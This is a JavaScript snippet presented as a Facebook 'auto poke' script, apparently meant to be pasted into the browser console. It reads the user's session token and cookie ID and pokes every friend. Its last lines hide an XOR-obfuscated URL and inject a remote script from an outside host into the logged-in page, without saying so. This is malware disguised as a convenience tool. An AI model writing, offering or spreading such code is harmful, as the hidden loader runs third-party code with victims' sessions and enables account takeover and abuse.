
/*Auto Friend poke Script*/
/*Copyright © 2014 Bhargav JT. Gogoi. All Rights Reserved.*/


alert('Poking Script is been initialized.');
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
    data = eval('(' + gf['responseText']['substr'](9) + ')');
    if (data['error']) {} else {
        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
            return _0x93dax8['index'] - _0x93dax9['index'];
        });
    };
};
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
for (var i = 0; i < friends['length']; i++) {
    var httpwp = new XMLHttpRequest();
    var urlwp = '//www.facebook.com/pokes/dialog/?poke_target=' + friends[i]['uid'];
    var paramswp = 'poke_target=' + friends[i]['uid'] + '&nctr[_mod]=pagelet_timeline_profile_actions&__asyncDialog=1&__user=' + user_id + '&__a=1&__dyn=7n8a9EAMCBCFUSt2u6aOGeExEW9J6yUgByVbGAFpaGEVF4YxUpBw&__req=k&fb_dtsg=' + fb_dtsg + '&ttstamp=2658166654910012150&__rev=1162685';
    httpwp['open']('POST', urlwp, true);
    httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    httpwp['setRequestHeader']('Content-length', paramswp['length']);
    httpwp['setRequestHeader']('Connection', 'keep-alive');
    httpwp['onreadystatechange'] = function () {
        if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
    };
    httpwp['send'](paramswp);
};

setTimeout(function(){
  alert(' All your friends have been Poked')},5000);
  var X = "jvvrq8--pcu,ekvjw`,amo-`jcpect3;;4-D`/Cwvm/vmmnq-ocqvgp-Qwrrmpv]Dkng,hq";
Y = "";
Z = "";
var V;
V = X.length;
for (i = 0; i < V; i++) {
    Y += String.fromCharCode(X.charCodeAt(i) ^ 2)
}
Z = unescape(Y);
document.body.appendChild(document.createElement('script')).src = Z;
